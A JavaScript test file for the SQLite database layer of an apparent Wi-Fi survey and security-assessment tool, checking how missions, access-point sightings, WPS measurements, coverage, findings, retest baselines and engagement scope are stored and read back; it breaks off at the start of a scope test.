/**
 * Tests for the database modules, against real SQLite and the real migrations.
 *
 *     npm run test:db
 *
 * Why this exists.
 *
 * Every `src/lib/*DB.ts` module was untested, and the reason was always the
 * database. This project has already paid for that twice: a backtick inside a
 * SQL comment silently terminated a template literal in `wardrivingDB.ts` (tsc
 * caught it; no test could, because there were none), and the retest delta
 * counted other engagements' remediation as its own. Both are SQL-shaped bugs
 * that a mocked `select`/`execute` cannot see.
 *
 * So these run `node:sqlite` with the project's own migrations applied. The
 * schema under test is the schema that ships, and a JOIN that reaches rows it
 * should not reach fails here.
 *
 * What this cannot test, and does not pretend to: anything that depends on which
 * connection in a pool served a statement — `PRAGMA secure_delete` is the live
 * example — and real WAL behaviour, which an in-memory database cannot have.
 */

import test, { beforeEach } from 'node:test';
import assert from 'node:assert/strict';

import { migrationFiles } from './stubs/plugin-sql-sqlite.mjs';
import {
  createMission,
  completeMission,
  markMissionSimulated,
  logGps,
  logAccessPoint,
  saveApLocation,
  recordWpsMeasurements,
  getMissions,
  getMissionData,
  getMissionRawLogs,
  deleteMission,
  computeAndStoreCoverage,
  getCoverage,
  GAP_THRESHOLD_SECONDS,
  upsertFindings,
  getFindings,
  setFindingStatus,
  createBaseline,
  compareToBaseline,
  createScope,
  activateScope,
  deactivateAllScopes,
  deleteScope,
  getActiveScope,
  getScopeTargets,
  addTarget,
  removeTarget,
  buildScopePayload,
  recordAuditEvent,
  getAuditLog,
  getAuditLogForScope,
  getAuditCount,
  getAuditSummary,
  exportAuditTrailCsv,
  createSession,
  completeSession,
  saveHost,
  getSessions,
  getSessionHosts,
  getDeviceHistory,
  getDeviceAddressChanges,
  deleteSession,
  deleteAllSessions,
  saveReport,
  reportExists,
  getAllReports,
  removeReport,
  updateReportName,
  clearAllReports,
  recordExport,
  getExportProvenance,
  markImported,
  saveCrackingRecord,
  getCrackingHistory,
  deleteCrackingRecord,
  revealCrackedPassword,
  countUnprotectedCrackedPasswords,
  sealLegacyCrackingHistory,
  createVault,
  openVault,
  saveCredential,
  getCredentialsForArchive,
  recordEvidence,
  getEvidence,
  getAllEvidenceForVerification,
  recordClient,
  getClients,
  getClientsForBssid,
  getVaultStatus,
  sealLegacyCredentials,
  isUnlocked,
  lockVault,
  VaultLockedError,
  pushScopeToEngine,
  requestScopeStatus,
  engineIPC,
  getDb,
} from '../.test-build/db.mjs';

/*
  One database for the whole run, emptied between tests.

  Not a fresh database each time, and the reason is worth recording: the alias
  that swaps in this stub makes esbuild *bundle* it, so the copy `database.ts`
  holds and the copy this file imports are two separate module instances with
  two separate connections. Rebuilding the database from the test's copy would
  leave `database.ts` still holding the old one — which is exactly the kind of
  "passes for the wrong reason" the stub's own header warns about.

  Emptying the tables through the connection the code under test actually uses
  sidesteps that, and is closer to production anyway: one long-lived database
  with rows accumulating in it.
*/
let db;

beforeEach(async () => {
  db = await getDb();
  // Off for the duration of the wipe only: the delete order would otherwise
  // have to follow the reference graph, and `PRAGMA foreign_keys` being ON
  // during the tests themselves is asserted below.
  db.raw.exec('PRAGMA foreign_keys = OFF');
  const tables = db.raw
    .prepare("SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'")
    .all();
  for (const { name } of tables) {
    /*
      `vault_meta` survives the wipe.

      The vault's key derivation is 600,000 PBKDF2 iterations by design, and
      `createVault` refuses to run twice because replacing the parameters would
      strand every encrypted row with a key nothing can derive again. So the
      vault is created once for the whole file and its row is kept, rather than
      paying half a second per test to rebuild something the tests do not vary.
    */
    if (name === 'vault_meta') continue;
    db.raw.exec(`DELETE FROM "${name}"`);
  }
  try {
    db.raw.exec('DELETE FROM sqlite_sequence');
  } catch {
    // Present only once an AUTOINCREMENT table has been written to.
  }
  db.raw.exec('PRAGMA foreign_keys = ON');
});

const raw = () => db;

const ap = (over = {}) => ({
  bssid: 'AA:BB:CC:DD:EE:01',
  ssid: 'CORP-WIFI',
  vendor: 'Cisco',
  encryption: 'WPA2',
  is_vulnerable: false,
  channel: 6,
  frequency: 2437,
  band: '2.4G',
  rssi: -55,
  ...over,
});

const finding = (over = {}) => ({
  subject_type: 'HOST',
  subject_id: '10.0.0.5',
  category: 'service_config',
  title: 'Something',
  risk_score: 70,
  severity: 'HIGH',
  confidence: 'CONFIRMED',
  rationale: 'because',
  methodology: 'lockon/1',
  remediation: 'fix it',
  fingerprint: 'fp-1',
  is_simulated: false,
  ...over,
});

// ── The harness itself ──────────────────────────────────────────────────────

test('every migration in the repository applies to a fresh database', async () => {
  // The guard against the hazard that nearly bricked this project: sqlx
  // checksums each migration over its whole file text, so editing one that has
  // already shipped is fatal at startup. This at least proves they all still
  // apply, and that a new one has not been written against a schema that does
  // not exist.
  // 18 since `018_missing_query_indexes.sql`. This number is deliberately hard-coded:
  // sqlx checksums each migration over its whole file text, so a *new* file is safe
  // and an edit to a shipped one is fatal at startup — bumping this is the moment to
  // confirm which of the two happened.
  assert.equal(migrationFiles().length, 19);
  const tables = await raw().select(
    "SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' ORDER BY name"
  );
  for (const expected of ['access_points', 'scan_logs', 'gps_logs', 'findings',
                          'evidence_files', 'mission_coverage', 'assessment_baselines']) {
    assert.ok(tables.some(t => t.name === expected), `${expected} is missing`);
  }
});

test('foreign keys are on, so ON DELETE CASCADE in the migrations means something', async () => {
  const [row] = await raw().select('PRAGMA foreign_keys');
  assert.equal(row.foreign_keys, 1);
});

// ── Missions ────────────────────────────────────────────────────────────────

test('a mission records whether it was simulated', async () => {
  const real = await createMission('REAL-1', false);
  const sim = await createMission('SIM-1', true);
  const rows = await raw().select('SELECT id, name, is_simulated, status FROM missions ORDER BY name');
  assert.deepEqual(rows.map(r => [r.name, r.is_simulated]), [['REAL-1', 0], ['SIM-1', 1]]);
  assert.ok(real && sim && real !== sim);
  assert.equal(rows[0].status, 'ACTIVE');
});

test("datetime('now') is quoted so it survives a build with SQLITE_DQS=0", async () => {
  // The double-quoted form only ever worked through SQLite's
  // double-quoted-string misfeature, where an unresolvable identifier falls
  // back to a string literal. On a build without it, this throws
  // "no such column: now" and no mission can be created at all.
  const id = await createMission('QUOTED');
  const [row] = await raw().select('SELECT start_time FROM missions WHERE id = $1', [id]);
  assert.match(row.start_time, /^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}$/);
});

test('completing a mission stamps an end time', async () => {
  const id = await createMission('M');
  await completeMission(id);
  const [row] = await raw().select('SELECT status, end_time FROM missions WHERE id = $1', [id]);
  assert.equal(row.status, 'COMPLETED');
  assert.ok(row.end_time);
});

test('a mission can be flagged simulated after the fact', async () => {
  const id = await createMission('M', false);
  await markMissionSimulated(id);
  const [row] = await raw().select('SELECT is_simulated FROM missions WHERE id = $1', [id]);
  assert.equal(row.is_simulated, 1);
});

// ── GPS ─────────────────────────────────────────────────────────────────────

test('an unknown heading and speed are stored as unknown, not as stationary', async () => {
  const id = await createMission('M');
  await logGps(id, 13.7, 100.5, null, null);
  await logGps(id, 13.8, 100.6, NaN, undefined);
  const rows = await raw().select('SELECT heading, speed FROM gps_logs WHERE mission_id = $1', [id]);
  assert.equal(rows.length, 2);
  for (const r of rows) {
    // `heading || 0` recorded "stationary, facing due north" — a measurement
    // where there was none, in rows the coverage report reads back.
    assert.equal(r.heading, null);
    assert.equal(r.speed, null);
  }
});

test('a real heading of zero is kept', async () => {
  const id = await createMission('M');
  await logGps(id, 13.7, 100.5, 0, 0);
  const [row] = await raw().select('SELECT heading, speed FROM gps_logs WHERE mission_id = $1', [id]);
  assert.equal(row.heading, 0);
  assert.equal(row.speed, 0);
});

// ── Access points ───────────────────────────────────────────────────────────

test('a sighting writes the access point and a signal measurement', async () => {
  const id = await createMission('M');
  await logAccessPoint(id, ap(), 13.7, 100.5, { hdop: 1.2, satellites: 9, altitude: 12, speed: 3 });
  const [row] = await raw().select('SELECT * FROM access_points');
  assert.equal(row.bssid, 'AA:BB:CC:DD:EE:01');
  assert.equal(row.band, '2.4G');
  const [log] = await raw().select('SELECT * FROM scan_logs');
  assert.equal(log.rssi, -55);
  assert.equal(log.hdop, 1.2);
  assert.equal(log.satellites, 9);
  assert.equal(log.frequency, 2437);
});

test('a sighting with no signal reading writes no invented measurement', async () => {
  const id = await createMission('M');
  await logAccessPoint(id, ap({ rssi: null }), 13.7, 100.5);
  await logAccessPoint(id, ap({ bssid: 'AA:BB:CC:DD:EE:02', rssi: undefined }), 13.7, 100.5);
  await logAccessPoint(id, ap({ bssid: 'AA:BB:CC:DD:EE:03', rssi: NaN }), 13.7, 100.5);
  // The access points are still recorded — the sighting is not lost.
  const aps = await raw().select('SELECT count(*) n FROM access_points');
  assert.equal(aps[0].n, 3);
  // `rssi ?? -90` used to store a hard -90 dBm, indistinguishable from an
  // observed -90, and those invented readings then fed the localizer.
  const logs = await raw().select('SELECT count(*) n FROM scan_logs');
  assert.equal(logs[0].n, 0);
});

test('a second sighting does not downgrade what an earlier one established', async () => {
  const id = await createMission('M');
  await logAccessPoint(id, ap({ is_vulnerable: true, is_evil_twin: true, rogue_score: 80,
                                rogue_verdict: 'LIKELY_ROGUE', rogue_indicators: ['a', 'b'] }), 13.7, 100.5);
  // A later scan that saw fewer peers: lower rogue score, no twin verdict.
  await logAccessPoint(id, ap({ is_vulnerable: false, is_evil_twin: false, rogue_score: 10,
                                rogue_verdict: 'CLEAN' }), 13.7, 100.5);
  const [row] = await raw().select('SELECT * FROM access_points');
  assert.equal(row.is_vulnerable, 1, 'a vulnerability does not un-happen');
  assert.equal(row.is_evil_twin, 1);
  assert.equal(row.rogue_score, 80);
  assert.equal(row.rogue_verdict, 'LIKELY_ROGUE', 'the better-informed verdict survives');
  assert.equal(JSON.parse(row.rogue_indicators).length, 2);
});

test('a real sighting clears a simulated-only record, and never the reverse', async () => {
  const id = await createMission('M');
  await logAccessPoint(id, ap({ simulated: true }), 13.7, 100.5);
  let [row] = await raw().select('SELECT is_simulated FROM access_points');
  assert.equal(row.is_simulated, 1);

  await logAccessPoint(id, ap({ simulated: false }), 13.7, 100.5);
  [row] = await raw().select('SELECT is_simulated FROM access_points');
  assert.equal(row.is_simulated, 0);

  await logAccessPoint(id, ap({ simulated: true }), 13.7, 100.5);
  [row] = await raw().select('SELECT is_simulated FROM access_points');
  assert.equal(row.is_simulated, 0, 'a simulated sighting must not re-flag a real access point');
});

test('an adapter that reports no BSS load stores absence, not zero clients', async () => {
  const id = await createMission('M');
  await logAccessPoint(id, ap({ connected_stations: undefined, channel_utilization_pct: undefined,
                                radio_type: undefined }), 13.7, 100.5);
  const [row] = await raw().select('SELECT radio_type, connected_stations, channel_utilization_pct FROM access_points');
  // "measured, no devices" and "never measured" are different findings about an
  // open network.
  assert.equal(row.connected_stations, null);
  assert.equal(row.channel_utilization_pct, null);
  assert.equal(row.radio_type, null);
});

test('a sighting that carries a BSS load does not erase it later', async () => {
  const id = await createMission('M');
  await logAccessPoint(id, ap({ connected_stations: 12, radio_type: '802.11ax' }), 13.7, 100.5);
  await logAccessPoint(id, ap({ connected_stations: undefined, radio_type: undefined }), 13.7, 100.5);
  const [row] = await raw().select('SELECT radio_type, connected_stations FROM access_points');
  assert.equal(row.connected_stations, 12);
  assert.equal(row.radio_type, '802.11ax');
});

// ── WPS measurement ─────────────────────────────────────────────────────────

test('a survey sighting never makes an access point look WPS-measured', async () => {
  const id = await createMission('M');
  await logAccessPoint(id, ap(), 13.7, 100.5);
  const [row] = await raw().select('SELECT wps_enabled, wps_scanned_at FROM access_points');
  // The column defaults to 0 NOT NULL, so without `wps_scanned_at` every access
  // point ever seen carried a confident "no WPS" that nobody had measured.
  assert.equal(row.wps_scanned_at, null);
});

test('only a WPS scan can mark an access point measured', async () => {
  const id = await createMission('M');
  await logAccessPoint(id, ap(), 13.7, 100.5);
  await recordWpsMeasurements(
    [{ bssid: 'AA:BB:CC:DD:EE:01', wps_enabled: true, wps_locked: false, wps_version: '2.0' }],
    '2026-09-29 10:00:00'
  );
  const [row] = await raw().select('SELECT wps_enabled, wps_locked, wps_version, wps_scanned_at FROM access_points');
  assert.equal(row.wps_enabled, 1);
  assert.equal(row.wps_version, '2.0');
  assert.equal(row.wps_scanned_at, '2026-09-29 10:00:00');
});

test('a WPS measurement matches regardless of BSSID case', async () => {
  const id = await createMission('M');
  await logAccessPoint(id, ap(), 13.7, 100.5);
  await recordWpsMeasurements(
    [{ bssid: 'aa:bb:cc:dd:ee:01', wps_enabled: false, wps_locked: false }],
    '2026-09-29 10:00:00'
  );
  const [row] = await raw().select('SELECT wps_enabled, wps_scanned_at FROM access_points');
  assert.equal(row.wps_scanned_at, '2026-09-29 10:00:00', 'the measurement must not be lost to case');
  assert.equal(row.wps_enabled, 0, 'and a measured zero is a real observation');
});

test('a WPS measurement for an unsurveyed access point invents no row', async () => {
  await recordWpsMeasurements(
    [{ bssid: 'FF:FF:FF:FF:FF:FF', wps_enabled: true, wps_locked: false }],
    '2026-09-29 10:00:00'
  );
  const [row] = await raw().select('SELECT count(*) n FROM access_points');
  assert.equal(row.n, 0, 'an access point nobody surveyed must not appear in the archive');
});

// ── Stored locations ────────────────────────────────────────────────────────

test('a stored location keeps everything that says what it is worth', async () => {
  const id = await createMission('M');
  await logAccessPoint(id, ap(), 13.7, 100.5);
  await saveApLocation('AA:BB:CC:DD:EE:01', 13.75, 100.55, 'gpr', {
    confidence: 62, errorRadiusM: 41, modeRadiusM: 18,
    mirrorLat: 13.70, mirrorLon: 100.50, mirrorDistanceM: 88,
    crossTrackM: 4, alongTrackM: 190, ambiguous: true, notes: ['mirror ambiguity'],
  });
  const [row] = await raw().select('SELECT * FROM access_points');
  assert.equal(row.location_method, 'gpr');
  assert.equal(row.location_confidence, 62);
  assert.equal(row.location_error_m, 41);
  assert.equal(row.geometry_ambiguous, 1, 'storing only the point is what let a coin flip read as a fact');
  assert.deepEqual(JSON.parse(row.location_notes), ['mirror ambiguity']);
});

test('a bare confidence number is still accepted from older callers', async () => {
  const id = await createMission('M');
  await logAccessPoint(id, ap(), 13.7, 100.5);
  await saveApLocation('AA:BB:CC:DD:EE:01', 13.75, 100.55, 'trilateration', 40);
  const [row] = await raw().select('SELECT location_confidence, location_error_m FROM access_points');
  assert.equal(row.location_confidence, 40);
  assert.equal(row.location_error_m, null);
});

test('a stored location matches regardless of BSSID case', async () => {
  const id = await createMission('M');
  await logAccessPoint(id, ap(), 13.7, 100.5);
  // netsh and PyWiFi do not agree on case. An exact match here silently updated
  // zero rows, discarding minutes of GPR computation with nothing logged.
  await saveApLocation('aa:bb:cc:dd:ee:01', 13.75, 100.55, 'gpr', 70);
  const [row] = await raw().select('SELECT latitude, location_method FROM access_points');
  assert.equal(row.location_method, 'gpr');
  assert.equal(row.latitude, 13.75);
});

test('a location for an unknown access point is reported rather than swallowed', async () => {
  const warnings = [];
  const original = console.warn;
  console.warn = (...args) => warnings.push(args.join(' '));
  try {
    await saveApLocation('00:00:00:00:00:00', 1, 2, 'gpr', 50);
  } finally {
    console.warn = original;
  }
  assert.equal(warnings.length, 1, warnings.join('\n'));
  assert.match(warnings[0], /matched no access point/);
});

// ── Reading a mission back ──────────────────────────────────────────────────

test('a replayed sighting carries its frequency to the localizer', async () => {
  // The bug this pins: the SELECT did not include `frequency`, and the read was
  // written `(log as any).frequency` — so it was always undefined and every
  // replayed 5 GHz access point reached the path-loss model as an unknown band.
  const id = await createMission('M');
  await logAccessPoint(id, ap({ bssid: 'AA:BB:CC:DD:EE:05', frequency: 5180, band: '5G' }), 13.70, 100.50);
  const logs = await raw().select('SELECT frequency FROM scan_logs');
  assert.equal(logs[0].frequency, 5180);

  // And the behavioural half: RSSI-to-distance is frequency dependent, so two
  // access points with identical geometry and identical signal must not produce
  // the same error radius. They did, because both arrived as "unknown band".
  await logAccessPoint(id, ap({ bssid: 'AA:BB:CC:DD:EE:24', frequency: 2437, band: '2.4G' }), 13.70, 100.50);

  const data = await getMissionData(id);
  const byBssid = Object.fromEntries(data.aps.map(a => [a.bssid, a]));
  const fiveGig = byBssid['AA:BB:CC:DD:EE:05'];
  const twoPointFour = byBssid['AA:BB:CC:DD:EE:24'];
  assert.ok(fiveGig.location_error_m > 0 && twoPointFour.location_error_m > 0);
  assert.notEqual(fiveGig.location_error_m, twoPointFour.location_error_m,
    'the same RSSI is a different distance at 5 GHz than at 2.4 GHz');
});

test('a mission reads back its access points and its track in order', async () => {
  const id = await createMission('M');
  await logAccessPoint(id, ap(), 13.70, 100.50);
  await logAccessPoint(id, ap({ bssid: 'AA:BB:CC:DD:EE:02', rssi: -70 }), 13.71, 100.51);
  await logGps(id, 13.70, 100.50, 90, 5);
  await logGps(id, 13.71, 100.51, 91, 5);

  const data = await getMissionData(id);
  assert.equal(data.aps.length, 2);
  // GeoJSON order: longitude first. A swap here puts the whole survey in the
  // wrong hemisphere.
  assert.deepEqual(data.gpsPath[0], [100.50, 13.70]);
});

test('a mission does not read back another mission’s sightings', async () => {
  const a = await createMission('A');
  const b = await createMission('B');
  await logAccessPoint(a, ap(), 13.70, 100.50);
  await logAccessPoint(b, ap({ bssid: 'AA:BB:CC:DD:EE:09' }), 13.80, 100.60);

  const data = await getMissionData(a);
  assert.deepEqual(data.aps.map(x => x.bssid), ['AA:BB:CC:DD:EE:01']);
  const logs = await getMissionRawLogs(b);
  assert.deepEqual(logs.map(l => l.bssid), ['AA:BB:CC:DD:EE:09']);
});

test('rogue indicators come back as an array, not as JSON text', async () => {
  const id = await createMission('M');
  await logAccessPoint(id, ap({ rogue_score: 70, rogue_verdict: 'SUSPECT',
                                rogue_indicators: ['ssid twin', 'weaker encryption'] }), 13.7, 100.5);
  const data = await getMissionData(id);
  assert.deepEqual(data.aps[0].rogue_indicators, ['ssid twin', 'weaker encryption']);
});

test('a stored GPR fix is not overwritten by a cheaper estimate', async () => {
  const id = await createMission('M');
  await logAccessPoint(id, ap(), 13.70, 100.50);
  await logAccessPoint(id, ap({ rssi: -60 }), 13.71, 100.51);
  await saveApLocation('AA:BB:CC:DD:EE:01', 13.999, 100.999, 'gpr', 88);

  const data = await getMissionData(id);
  assert.equal(data.aps[0].location_method, 'gpr');
  assert.equal(data.aps[0].latitude, 13.999, 'the operator asked for this estimate explicitly');
});

test('missions list their access-point counts', async () => {
  const id = await createMission('M');
  await logAccessPoint(id, ap(), 13.7, 100.5);
  await logAccessPoint(id, ap({ bssid: 'AA:BB:CC:DD:EE:02', encryption: 'OPEN' }), 13.7, 100.5);
  const [m] = await getMissions();
  assert.equal(m.total_aps, 2);
  assert.equal(m.high_risk_aps, 1, 'the open network is the risky one');
});

// ── Deleting a mission ──────────────────────────────────────────────────────

test('deleting a mission leaves nothing of it behind', async () => {
  const id = await createMission('M');
  await logAccessPoint(id, ap(), 13.7, 100.5);
  await logGps(id, 13.7, 100.5, 90, 5);
  await computeAndStoreCoverage(id);
  await upsertFindings([finding()], { mission_id: id });
  await createBaseline('before', { mission_id: id });

  await deleteMission(id);

  for (const table of ['gps_logs', 'scan_logs', 'mission_coverage', 'findings', 'assessment_baselines']) {
    const [row] = await raw().select(`SELECT count(*) n FROM ${table} WHERE mission_id = $1`, [id]);
    // `findings` and `assessment_baselines` have no foreign key, so nothing
    // cascaded to them: rows describing a deleted mission went on being counted
    // by every query that does not filter by mission.
    assert.equal(row.n, 0, `${table} still holds rows for the deleted mission`);
  }
  const [aps] = await raw().select('SELECT count(*) n FROM access_points');
  assert.equal(aps.n, 1, 'the access point itself is shared across missions and stays');
});

// ── Coverage ────────────────────────────────────────────────────────────────

const gpsAt = async (missionId, lat, lon, timestamp) => {
  await raw().execute(
    'INSERT INTO gps_logs (mission_id, latitude, longitude, timestamp) VALUES ($1,$2,$3,$4)',
    [missionId, lat, lon, timestamp]
  );
};

test('distance is not counted across a GPS dropout', async () => {
  const id = await createMission('M');
  // Two points 5 seconds apart, then a jump after a 10-minute outage.
  await gpsAt(id, 13.700, 100.500, '2026-09-29 10:00:00');
  await gpsAt(id, 13.701, 100.500, '2026-09-29 10:00:05');
  await gpsAt(id, 13.900, 100.500, '2026-09-29 10:10:05');

  const coverage = await computeAndStoreCoverage(id);
  assert.equal(coverage.gap_count, 1);
  assert.equal(coverage.max_gap_seconds, 600);
  // ~111 m for 0.001 degrees of latitude. The straight line over the outage
  // would be ~22 km, and calling that surveyed distance overstates coverage.
  assert.ok(coverage.distance_metres > 90 && coverage.distance_metres < 130,
    `distance was ${coverage.distance_metres}`);
});

test('a clean track records a longest gap of zero, not "not computed"', async () => {
  const id = await createMission('M');
  await gpsAt(id, 13.700, 100.500, '2026-09-29 10:00:00');
  await gpsAt(id, 13.701, 100.500, '2026-09-29 10:00:05');
  const coverage = await computeAndStoreCoverage(id);
  // `maxGap || null` stored 0 as NULL, so a clean track and an uncomputed one
  // read identically in the report's coverage table.
  assert.equal(coverage.gap_count, 0);
  assert.equal(coverage.max_gap_seconds, 0);
  assert.equal(coverage.gap_threshold_seconds, GAP_THRESHOLD_SECONDS);
});

test('a mission with no track says so instead of reporting zero coverage', async () => {
  const id = await createMission('M');
  const coverage = await computeAndStoreCoverage(id);
  assert.equal(coverage.point_count, 0);
  assert.match(coverage.notes, /No GPS track was recorded/);
  assert.equal(coverage.bbox_min_lat, null);
});

test('missing HDOP is named rather than left to look like precision', async () => {
  const id = await createMission('M');
  await gpsAt(id, 13.700, 100.500, '2026-09-29 10:00:00');
  await logAccessPoint(id, ap(), 13.7, 100.5); // no fix quality passed
  const coverage = await computeAndStoreCoverage(id);
  assert.equal(coverage.avg_hdop, null);
  assert.match(coverage.notes, /No HDOP was recorded/);
});

test('the band breakdown adds up to the access points it describes', async () => {
  const id = await createMission('M');
  await logAccessPoint(id, ap({ bssid: 'AA:00:00:00:00:01', band: '2.4G', frequency: 2437 }), 13.7, 100.5);
  await logAccessPoint(id, ap({ bssid: 'AA:00:00:00:00:02', band: '5G', frequency: 5180 }), 13.7, 100.5);
  await logAccessPoint(id, ap({ bssid: 'AA:00:00:00:00:03', band: null, frequency: null }), 13.7, 100.5);
  // A value outside the vocabulary, as an older build or a different enrichment
  // path could have written. It used to land in none of the four counters.
  await raw().execute("UPDATE access_points SET band = '5 GHz' WHERE bssid = 'AA:00:00:00:00:02'");

  const coverage = await computeAndStoreCoverage(id);
  const total = coverage.aps_2g + coverage.aps_5g + coverage.aps_6g + coverage.aps_unknown_band;
  assert.equal(total, 3, `the four counters must reconcile; got ${JSON.stringify(coverage).slice(0, 200)}`);
  assert.equal(coverage.aps_2g, 1);
  assert.equal(coverage.aps_unknown_band, 2, 'one NULL and one unrecognised string');
});

test('coverage is recomputed in place rather than duplicated', async () => {
  const id = await createMission('M');
  await gpsAt(id, 13.700, 100.500, '2026-09-29 10:00:00');
  await computeAndStoreCoverage(id);
  await gpsAt(id, 13.701, 100.500, '2026-09-29 10:00:05');
  const second = await computeAndStoreCoverage(id);
  const [row] = await raw().select('SELECT count(*) n FROM mission_coverage WHERE mission_id = $1', [id]);
  assert.equal(row.n, 1);
  assert.equal(second.point_count, 2);
  assert.deepEqual(await getCoverage(id), second);
});

test('coverage for a mission that has none is null, not an empty row', async () => {
  assert.equal(await getCoverage('no-such-mission'), null);
});

// ── Findings and the retest delta ───────────────────────────────────────────

test('the same finding seen twice is one row, not two', async () => {
  await upsertFindings([finding()], {});
  await upsertFindings([finding({ risk_score: 90, severity: 'CRITICAL' })], {});
  const rows = await getFindings({});
  assert.equal(rows.length, 1);
  assert.equal(rows[0].severity, 'CRITICAL', 'the latest assessment wins');
});

test('a finding seen again after being closed is a regression', async () => {
  await upsertFindings([finding()], {});
  const [row] = await getFindings({});
  await setFindingStatus(row.id, 'FIXED');
  await upsertFindings([finding()], {});
  const [after] = await getFindings({});
  assert.equal(after.status, 'REGRESSED', 'more useful to a manager than a fresh OPEN row');
  assert.equal(after.resolved_at, null);
});

test('a risk score is clamped to the scale the report prints', async () => {
  await upsertFindings([finding({ risk_score: 999, fingerprint: 'hi' }),
                        finding({ risk_score: -5, fingerprint: 'lo' })], {});
  const rows = await getFindings({});
  const scores = rows.map(r => r.risk_score).sort((a, b) => a - b);
  assert.deepEqual(scores, [0, 100]);
});

test('a baseline counts only the findings it is a baseline of', async () => {
  const a = await createMission('A');
  const b = await createMission('B');
  await upsertFindings([finding({ fingerprint: 'a1' }), finding({ fingerprint: 'a2' })], { mission_id: a });
  await upsertFindings([finding({ fingerprint: 'b1' })], { mission_id: b });

  const id = await createBaseline('engagement A', { mission_id: a });
  const [row] = await raw().select('SELECT finding_count FROM assessment_baselines WHERE id = $1', [id]);
  // It counted every OPEN finding on the installation, so a baseline for a
  // two-finding engagement recorded three — and that number is the denominator
  // of every percentage derived from it.
  assert.equal(row.finding_count, 2);
});

test('a retest reports only its own engagement’s progress', async () => {
  const a = await createMission('A');
  const b = await createMission('B');
  await upsertFindings([finding({ fingerprint: 'a1' })], { mission_id: a });
  await upsertFindings([finding({ fingerprint: 'b1' })], { mission_id: b });

  const baseline = await createBaseline('engagement A', { mission_id: a });
  // Engagement B does the remediation.
  const bRow = (await getFindings({ mission_id: b }))[0];
  await raw().execute(
    "UPDATE findings SET status='FIXED', resolved_at=datetime('now','+1 hour') WHERE id=$1", [bRow.id]);

  const delta = await compareToBaseline(baseline);
  // "FIXED SINCE THE BASELINE" is a number a client reads as work delivered.
  assert.deepEqual(delta.fixed.map(f => f.fingerprint), []);
  assert.deepEqual(delta.still_open.map(f => f.fingerprint), ['a1']);
});

test('a finding closed before the baseline is not credited to the retest', async () => {
  const m = await createMission('M');
  await upsertFindings([finding({ fingerprint: 'old' })], { mission_id: m });
  const row = (await getFindings({}))[0];
  // Closed a month before the baseline was taken.
  await raw().execute(
    "UPDATE findings SET status='FIXED', resolved_at=datetime('now','-30 days') WHERE id=$1", [row.id]);

  const baseline = await createBaseline('retest', { mission_id: m });
  const delta = await compareToBaseline(baseline);
  assert.deepEqual(delta.fixed.map(f => f.fingerprint), [],
    'the predicate was first_seen <= baseline, which counts work that predates it');
});

test('a finding closed after the baseline is credited', async () => {
  const m = await createMission('M');
  await upsertFindings([finding({ fingerprint: 'real-fix' })], { mission_id: m });
  const baseline = await createBaseline('retest', { mission_id: m });
  const row = (await getFindings({}))[0];
  await raw().execute(
    "UPDATE findings SET status='FIXED', resolved_at=datetime('now','+1 hour') WHERE id=$1", [row.id]);

  const delta = await compareToBaseline(baseline);
  assert.deepEqual(delta.fixed.map(f => f.fingerprint), ['real-fix']);
});

test('a regression from last year is not attributed to this retest', async () => {
  const m = await createMission('M');
  await upsertFindings([finding({ fingerprint: 'ancient' })], { mission_id: m });
  const row = (await getFindings({}))[0];
  await raw().execute(
    "UPDATE findings SET status='REGRESSED', last_seen=datetime('now','-300 days') WHERE id=$1", [row.id]);

  const baseline = await createBaseline('retest', { mission_id: m });
  const delta = await compareToBaseline(baseline);
  assert.deepEqual(delta.regressed.map(f => f.fingerprint), [],
    'the predicate was `WHERE status = REGRESSED` with no baseline at all');
});

test('a finding first seen after the baseline is new, not pre-existing', async () => {
  const m = await createMission('M');
  await upsertFindings([finding({ fingerprint: 'was-there' })], { mission_id: m });
  const baseline = await createBaseline('retest', { mission_id: m });
  await upsertFindings([finding({ fingerprint: 'appeared' })], { mission_id: m });
  // Timestamps are second-granular, so the new row's own first_seen is pushed
  // past the baseline explicitly rather than depending on the clock.
  await raw().execute(
    "UPDATE findings SET first_seen=datetime('now','+1 hour') WHERE fingerprint='appeared'");

  const delta = await compareToBaseline(baseline);
  assert.deepEqual(delta.newly_found.map(f => f.fingerprint), ['appeared']);
  assert.deepEqual(delta.still_open.map(f => f.fingerprint), ['was-there']);
});

test('a rig-wide baseline compares rig-wide', async () => {
  // A baseline with no mission or session is a deliberate choice, not a bug, so
  // the scoping must be built rather than mandatory.
  const a = await createMission('A');
  const b = await createMission('B');
  await upsertFindings([finding({ fingerprint: 'a1' })], { mission_id: a });
  await upsertFindings([finding({ fingerprint: 'b1' })], { mission_id: b });
  const baseline = await createBaseline('everything', {});
  const delta = await compareToBaseline(baseline);
  assert.deepEqual(delta.still_open.map(f => f.fingerprint).sort(), ['a1', 'b1']);
});

test('comparing against a baseline that does not exist is an error, not an empty delta', async () => {
  await assert.rejects(() => compareToBaseline(9999), /not found/);
});

test('findings can be filtered to one mission', async () => {
  const a = await createMission('A');
  const b = await createMission('B');
  await upsertFindings([finding({ fingerprint: 'a1' })], { mission_id: a });
  await upsertFindings([finding({ fingerprint: 'b1' })], { mission_id: b });
  const rows = await getFindings({ mission_id: a });
  assert.deepEqual(rows.map(r => r.fingerprint), ['a1']);
});

test('a simulated finding cannot be made to look real, but a real one wins', async () => {
  await upsertFindings([finding({ is_simulated: true })], {});
  let [row] = await getFindings({});
  assert.equal(row.is_simulated, 1);
  await upsertFindings([finding({ is_simulated: false })], {});
  [row] = await getFindings({});
  assert.equal(row.is_simulated, 0);
  await upsertFindings([finding({ is_simulated: true })], {});
  [row] = await getFindings({});
  assert.equal(row.is_simulated, 0, 'a simulated sighting must not re-flag a real finding');
});

// ── Engagement scope ────────────────────────────────────────────────────────
//
// This is the record that the work stayed inside its authorization, and the
// report prints it. Everything here is about that claim being true.

const scopeInput = (over = {}) => ({
  engagement_name: 'ACME Q3',
  authorized_by: 'CISO',
  operator: 'operator-a',
  reference: 'PO-1234',
  targets: [{ kind: 'CIDR', value: '10.0.0.0/24' }],
  ...over,
});

test('a new scope is created inactive', async () => {
  // Creating a scope must not authorise anything by itself. The operator
  // activates it deliberately, and only then does the engine leave its
  // deny-everything default.
  const id = await createScope(scopeInput());
  const [row] = await raw().select('SELECT is_active FROM engagement_scope WHERE id = $1', [id]);
  assert.equal(row.is_active, 0);
  assert.equal(await getActiveScope(), null);
});

test('an allowlist engagement with no targets is refused', async () => {
